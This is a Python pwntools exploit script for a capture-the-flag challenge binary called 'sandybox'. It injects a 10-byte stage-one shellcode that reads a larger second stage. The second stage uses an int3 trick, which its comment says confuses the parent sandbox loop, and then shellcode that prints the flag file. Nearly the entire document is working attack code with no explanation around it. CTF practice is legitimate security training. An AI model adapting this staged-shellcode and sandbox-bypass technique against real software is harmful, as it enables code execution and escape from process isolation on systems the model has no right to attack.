#!/usr/bin/python3
from pwn import *

context.arch='amd64'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
e = context.binary = ELF("./sandybox")
p=process([e.path])
# gdb.attach(p)

# 10 bytes max
shellcode = asm('''
push 1000
pop rdx
xor eax, eax
syscall
''', arch='amd64') # syscall read to read 1024 bytes of shellcode

print(len(shellcode)) # debug
assert(len(shellcode)==10)
# gdb.attach(p)

shellcode += asm('''
nop
nop
nop
nop
nop
nop
nop
mov rax, 8
int3
''', arch='amd64') # wake parent, confuse loop

shellcode += asm(shellcraft.amd64.cat('flag'), arch='amd64')

# info(str(len(shellcode)))
context.log_level='debug'

p.send(shellcode)

p.recvall()
